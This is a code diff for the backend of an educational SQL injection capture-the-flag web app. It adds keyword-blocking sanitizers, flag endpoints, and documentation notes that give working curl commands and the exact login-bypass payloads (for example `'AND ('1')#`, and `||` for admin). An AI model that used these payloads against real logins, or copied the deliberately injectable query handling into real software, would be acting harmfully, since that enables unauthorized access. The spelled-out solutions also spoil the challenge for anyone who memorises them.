@@ -61,11 +61,7 @@ intended attack vector:
 
 CTF Mode
 --------
-When running in CTF mode, successful exploitation updates the ``ctf_progress``
-table, allowing the system to expose flags through a dedicated API endpoint.
-
-Outside CTF mode, no flag or progress information is revealed and SQLi attempts
-will not succeed as the safe library is used.
+As a CTF Project, Only CTF Mode is activated, no production.
 
 Summary
 -------
@@ -76,188 +72,152 @@ This codebase is a **controlled, educational example** designed to show:
 * How CTF challenges can be structured to enforce specific learning outcomes
 
 It should be studied as a teaching artifact, not used as a security reference.
+
+Note:
+-------
+For the User Login section, our backend uses ``AND`` to inject code, but this presents an additional challenge for
+the frontend by disabling ``AND``. Therefore, the solution is either to manipulate the code in the JavaScript or to
+directly interact with the backend (this is a deliberate point of interaction where the frontend and backend
+share the same port).
+
+For learners unfamiliar with creating JavaScript payloads, we recommend using the terminal directly.
+
+* macOS:
+
+  ````
+  curl -s -X POST http://127.0.0.1:8000/api/login/user \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    --data-urlencode "email=alice@example.com'AND ('1')#" \
+    --data-urlencode "password=anything" \
+    | jq -r '"http://127.0.0.1:8000/personal_space?username=\(.username)&jwt=\(.jwt)"' \
+    | xargs open
+  ````
+
+* **Linux**:
+
+  ````
+  curl -s -X POST http://127.0.0.1:8000/api/login/user \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    --data-urlencode "email=alice@example.com'AND ('1')#" \
+    --data-urlencode "password=anything" \
+    | jq -r '"http://127.0.0.1:8000/personal_space?username=\(.username)&jwt=\(.jwt)"' \
+    | xargs xdg-open
+  ````
+
+The injection in the admin login section actually uses dependencies ``or`` relationships, but
+the ``OR`` keyword itself is not allowed. Users need to understand that ``||`` and ``OR`` are equivalent.
 """
 
+import hashlib
+import os
+import re
+from collections.abc import Callable
+from typing import Optional
+
 from fastapi import FastAPI, HTTPException
-from fastapi.middleware.cors import CORSMiddleware
 from fastapi import Form  # python-multipart support
 from fastapi import Query
+from fastapi.responses import HTMLResponse
+from fastapi.staticfiles import StaticFiles
+import builtins
+
+builtins.CTF_MODE = "ctf"
 
 from sqli_ctf import ctf_sql
-
-import time
-import hashlib
-import jwt
-
-# =========================
-# JWT Configuration
-# =========================
-
-JWT_SECRET = "dev-secret-for-ctf"
-
-JWT_SECRET_USER = "dev-secret-for-ctf-user"
-JWT_SECRET_ADMIN = "dev-secret-for-ctf-admin"
-JWT_ALGO = "HS256"
-
-JWT_EXPIRE_SECONDS = 3600  # 1 hour
-
-# =========================
-# Internal Constants
-# =========================
-
-# User-side secret fragments
-USER_MID_1 = "thisisanexample"
-USER_MID_2 = "cool"
-
-# Admin-side secret fragments (must be different)
-ADMIN_MID_1 = "rootpower"
-ADMIN_MID_2 = "adminonly"
-
-ADD_NUM = 0xEEE7
-
-
-# =========================
-# User JWT Helpers
-# =========================
-
-def make_user_proof(username: str, email: str, ts: int) -> str:
-    """
-    Generate a short proof string bound to user identity and login timestamp
-    """
-    base = f"{username}{USER_MID_1}{email}{USER_MID_2}{ts}"
-    h = hashlib.sha256(base.encode()).hexdigest()
-    num = int(h, 16) + ADD_NUM
-    return hex(num)[2:].upper()[-4:]
-
-
-def make_user_token(username: str, email: str) -> str:
-    """
-    Create a signed JWT for a normal user
-    """
-    ts = int(time.time())
-    payload = {
-        "role": "user",
-        "username": username,
-        "email": email,
-        "login_ts": ts,
-        "proof": make_user_proof(username, email, ts),
-        "exp": ts + JWT_EXPIRE_SECONDS,
-    }
-    return jwt.encode(payload, JWT_SECRET_USER, algorithm=JWT_ALGO)
-
-
-def verify_user_token(token: str, username: str) -> dict | None:
-    """
-    Verify user JWT integrity and bind it to the requested username
-    """
-    try:
-        payload = jwt.decode(
-            token,
-            JWT_SECRET_USER,
-            algorithms=[JWT_ALGO],
-        )
-
-        if payload.get("role") != "user":
-            return None
-
-        if payload["username"] != username:
-            return None
-
-        expect = make_user_proof(
-            payload["username"],
-            payload["email"],
-            payload["login_ts"],
-        )
-
-        if payload["proof"] != expect:
-            return None
-
-        return payload
-
-    except jwt.PyJWTError:
-        return None
-
-
-# =========================
-# Admin JWT Helpers
-# =========================
-
-def make_admin_proof(username: str, ts: int) -> str:
-    """
-    Generate a short proof string for admin tokens
-    """
-    base = f"{username}{ADMIN_MID_1}{ADMIN_MID_2}{ts}"
-    h = hashlib.sha256(base.encode()).hexdigest()
-    num = int(h, 16) + ADD_NUM
-    return hex(num)[2:].upper()[-4:]
-
-
-def make_admin_token(username: str) -> str:
-    """
-    Create a signed JWT for admin users
-    """
-    ts = int(time.time())
-    payload = {
-        "role": "admin",
-        "username": username,
-        "login_ts": ts,
-        "proof": make_admin_proof(username, ts),
-        "exp": ts + JWT_EXPIRE_SECONDS,
-    }
-    return jwt.encode(payload, JWT_SECRET_ADMIN, algorithm=JWT_ALGO)
-
-
-def verify_admin_token(token: str) -> dict | None:
-    """
-    Verify admin JWT integrity
-    """
-    try:
-        payload = jwt.decode(
-            token,
-            JWT_SECRET_ADMIN,
-            algorithms=[JWT_ALGO],
-        )
-
-        if payload.get("role") != "admin":
-            return None
-
-        expect = make_admin_proof(
-            payload["username"],
-            payload["login_ts"],
-        )
-
-        if payload["proof"] != expect:
-            return None
-
-        return payload
-
-    except jwt.PyJWTError:
-        return None
-
-
-# =========================
-# Application Setup
-# =========================
+from .config import ADMIN_URL, ADMIN_LOGIN_URL, dump_config
+from .jwt_plugin import (
+    make_user_token, make_admin_token,
+    verify_user_token, verify_admin_token
+)
 
 app = FastAPI(title="Personal Blog Backend")
 
-app.add_middleware(
-    CORSMiddleware,  # noqa
-    allow_origins=["*"],
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+FRONTEND_DIR = os.path.join(BASE_DIR, "frontend")
+STATIC_DIR = os.path.join(BASE_DIR, "static")
+
+dump_config()
+
+app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
+
+"""
+Why design a global user? 
+Firstly, there are no concurrency issues in monolithic operations, making global operations suitable for CTFs.
+
+Secondly, we are essentially checking whether a user truly found a user named "alice" through `/api/home` 
+and obtained the actual JWT using the leaked email address and SQLI.
+
+Guessing an email address does not count towards the score.
+"""
+global_user: Optional[str] = None
 
 
-def get_conn():
+def get_conn(sanitizer: Optional[Callable[[str], str]] = None):
     """
     Create a database connection
     """
+    print(f"acquiring connection from: {ctf_sql.constants.CTF_SESSION_NAME}")
+    if ctf_sql.SESSION_NAME == ctf_sql.constants.CTF_SESSION_NAME:
+        return ctf_sql.MySql.connect(
+            host=ctf_sql.DB_HOST,
+            user=ctf_sql.DB_USER,
+            passwd=ctf_sql.DB_PASS,
+            db=ctf_sql.DB_NAME,
+            sanitizer=sanitizer,
+        )
     return ctf_sql.MySql.connect(
         host=ctf_sql.DB_HOST,
         user=ctf_sql.DB_USER,
         passwd=ctf_sql.DB_PASS,
         db=ctf_sql.DB_NAME,
+    )
+
+
+# =========================
+# HTML Routes
+# =========================
+
+@app.get("/", response_class=HTMLResponse)
+async def serve_index():
+    with open(os.path.join(FRONTEND_DIR, "index.html"), "r") as f:
+        return f.read()
+
+
+@app.get(ADMIN_URL, response_class=HTMLResponse)
+async def serve_admin():
+    path = os.path.join(FRONTEND_DIR, "admin.html")
+    with open(path, "r", encoding="utf-8") as f:
+        content = f.read()
+
+    # Replace __ADMIN_LOGIN__ with "ADMIN_LOGIN_URL"
+    content = content.replace("__ADMIN_LOGIN__", f'"{ADMIN_LOGIN_URL}"')
+
+    return content
+
+
+@app.get(ADMIN_LOGIN_URL, response_class=HTMLResponse)
+async def serve_admin_login():
+    path = os.path.join(FRONTEND_DIR, "admin_login.html")
+    with open(path, "r", encoding="utf-8") as f:
+        content = f.read()
+
+    # Replace _ADMIN_ with ADMIN_URL
+    content = content.replace("_ADMIN_", ADMIN_URL)
+
+    return content
+
+
+@app.get("/personal_space", response_class=HTMLResponse)
+async def serve_personal_space():
+    with open(os.path.join(FRONTEND_DIR, "personal_space.html"), "r") as f:
+        return f.read()
+
+
+@app.get("/favicon.ico")
+async def fake_favicon():
+    raise HTTPException(
+        status_code=404,
+        detail="Not Found. Static assets may be accessible under /static"
     )
 
 
@@ -294,7 +254,7 @@ def home():
     cur.close()
     conn.close()
 
-    return [
+    res = [
         {
             "post_id": r[0],
             "title": r[1],
@@ -305,6 +265,11 @@ def home():
         }
         for r in rows
     ]
+    global global_user
+
+    global_user = None if len(res) == 0 else res[0]["author"]
+
+    return res
 
 
 @app.get("/api/user/{username}")
@@ -359,6 +324,70 @@ def user_page(
 # Authentication APIs
 # =========================
 
+def sanitize_email(email: str) -> str:
+    email = email.strip()
+    email = re.sub(r'[\n\t\r]', ' ', email)
+
+    ILLEGALS = ['OR', '=', '>', '<', 'LIKE', 'IN', 'BETWEEN', 'TRUE', 'FALSE', '--', '|', '\'#', ' #']
+
+    """
+    no OR logic (including '||')
+    no direct "alice@example.com' #" or "alice@example.com'#"
+    The respondent is forced to construct a tautology condition to place after the AND operation.
+    """
+
+    upper_email = email.upper()
+
+    if any(illegal in upper_email for illegal in ILLEGALS):
+        raise ValueError
+
+    if re.search(r'AND\s+\d+', upper_email):
+        # direct 'AND 1'
+        raise ValueError
+
+    if re.match(r'^.*\(\s*(?:\d[\s\S]*?|[\s\S]*?\d)\s*\).*', upper_email):
+        # direct '(1)'
+        raise ValueError
+
+    # "alice@example.com' AND ('1')#" is the only possible ctf sqli form
+
+    return email
+
+
+def sanitize_admin(admin_name: str) -> str:
+    admin_name = admin_name.strip()
+    admin_name = re.sub(r'[\n\t\r]', ' ', admin_name)
+    pattern = r"^(?:[^']*$|[^']*?(?:[A-Za-z][^']*){5}')"
+
+    ILLEGALS = ['OR', '=', '>', '<', 'LIKE', 'IN', 'BETWEEN', 'TRUE', 'FALSE', '--', 'AND', '\'#', ' #']
+
+    """
+    The respondent is forced to construct a tautology condition to place after the OR(||) operation.
+    """
+
+    upper_admin_name = admin_name.upper()
+
+    if any(illegal in upper_admin_name for illegal in ILLEGALS):
+        raise ValueError
+
+    if not re.match(pattern, admin_name):
+        # admin should have no quote
+        # OR at least 5 latin letters before the first quote
+        raise ValueError
+
+    if re.search(r'\|\|\s+\d+', upper_admin_name):
+        # direct '|| 1'
+        raise ValueError
+
+    if re.match(r'^.*\(\s*(?:\d[\s\S]*?|[\s\S]*?\d)\s*\).*', upper_admin_name):
+        # direct '(1)'
+        raise ValueError
+
+    # "{at least 5 latins}' || ('1')#" is the only possible ctf sqli form
+
+    return admin_name
+
+
 @app.post("/api/login/user")
 def login_user(
         email: str = Form(...),
@@ -368,8 +397,18 @@ def login_user(
     cur = None
 
     try:
-        conn = get_conn()
+        conn = get_conn(sanitize_email)
         cur = conn.cursor()
+
+        pattern = r'^[^@]+@[^@\.]+\.[^@\.]+'
+
+        if not re.match(pattern, email):
+            return {
+                "success": False,
+                "username": None,
+                "jwt": None,
+                "error": "not an email",
+            }
 
         password_hash = hashlib.sha256(password.encode()).hexdigest()
 
@@ -391,14 +430,6 @@ def login_user(
 
         user_id, real_username, email = row
 
-        if ctf_sql.SESSION_NAME == ctf_sql.constants.CTF_SESSION_NAME:
-            cur.execute("""
-                UPDATE ctf_progress
-                SET user_pwned = TRUE
-                WHERE id = 1
-            """)
-            conn.commit()
-
         jwt_ = make_user_token(real_username, email)
 
         return {
@@ -406,7 +437,8 @@ def login_user(
             "username": real_username,
             "jwt": jwt_,
         }
-    except ctf_sql.MySql.MySQLError:
+
+    except (ctf_sql.MySql.MySQLError, ValueError):
 
         return {
             "success": False,
@@ -431,7 +463,7 @@ def login_admin(
     cur = None
 
     try:
-        conn = get_conn()
+        conn = get_conn(sanitize_admin)
         cur = conn.cursor()
 
         password_hash = hashlib.sha256(password.encode()).hexdigest()
@@ -449,14 +481,6 @@ def login_admin(
                 "jwt": None,
             }
 
-        if ctf_sql.SESSION_NAME == ctf_sql.constants.CTF_SESSION_NAME:
-            cur.execute("""
-                UPDATE ctf_progress
-                SET admin_pwned = TRUE
-                WHERE id = 1
-            """)
-            conn.commit()
-
         admin_jwt = make_admin_token(username)
 
         return {
@@ -465,7 +489,7 @@ def login_admin(
             "jwt": admin_jwt,
         }
 
-    except ctf_sql.MySql.MySQLError:
+    except (ctf_sql.MySql.MySQLError, ValueError):
 
         return {
             "success": False,
@@ -499,6 +523,62 @@ def check_admin(jwt_token: str = Query(..., alias="jwt")):
 # =========================
 # CTF Progress API
 # =========================
+
+@app.post("/api/user/answer/{jwt}")
+def user_answer(jwt: str):
+    if ctf_sql.SESSION_NAME != ctf_sql.constants.CTF_SESSION_NAME:
+        return {"success": False, "error": "ctf_disabled"}
+
+    payload = verify_user_token(jwt, username=global_user)
+    if not payload:
+        raise HTTPException(status_code=401, detail="invalid_user_jwt")
+
+    conn = get_conn()
+    cur = conn.cursor()
+
+    cur.execute("""
+        UPDATE ctf_progress
+        SET user_pwned = TRUE
+        WHERE id = 1 AND user_pwned = FALSE
+    """)
+    conn.commit()
+
+    cur.close()
+    conn.close()
+
+    return {
+        "success": True,
+        "flag": "user",
+    }
+
+
+@app.post("/api/admin/answer/{jwt}")
+def admin_answer(jwt: str):
+    if ctf_sql.SESSION_NAME != ctf_sql.constants.CTF_SESSION_NAME:
+        return {"success": False, "error": "ctf_disabled"}
+
+    payload = verify_admin_token(jwt)
+    if not payload:
+        raise HTTPException(status_code=401, detail="invalid_admin_jwt")
+
+    conn = get_conn()
+    cur = conn.cursor()
+
+    cur.execute("""
+        UPDATE ctf_progress
+        SET admin_pwned = TRUE
+        WHERE id = 1 AND admin_pwned = FALSE
+    """)
+    conn.commit()
+
+    cur.close()
+    conn.close()
+
+    return {
+        "success": True,
+        "flag": "admin",
+    }
+
 
 @app.get("/api/flags")
 def flags():
